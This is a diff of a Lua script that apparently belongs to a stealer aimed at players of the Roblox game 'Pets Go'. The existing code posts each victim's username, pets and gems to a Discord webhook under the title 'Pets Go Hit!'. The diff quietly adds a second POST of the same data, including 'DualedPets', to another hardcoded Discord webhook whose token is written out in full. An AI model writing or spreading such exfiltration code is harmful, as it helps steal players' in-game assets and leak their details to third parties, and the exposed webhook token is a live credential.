@@ -6,6 +6,12 @@ msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer
 else
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 end
+local log = ""
+if dh then
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
+else
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
+end
 local response =
         request(
         {
@@ -13,6 +19,15 @@ local response =
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = msg
+        }
+    )
+local responser =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = log
         }
     )
 return response
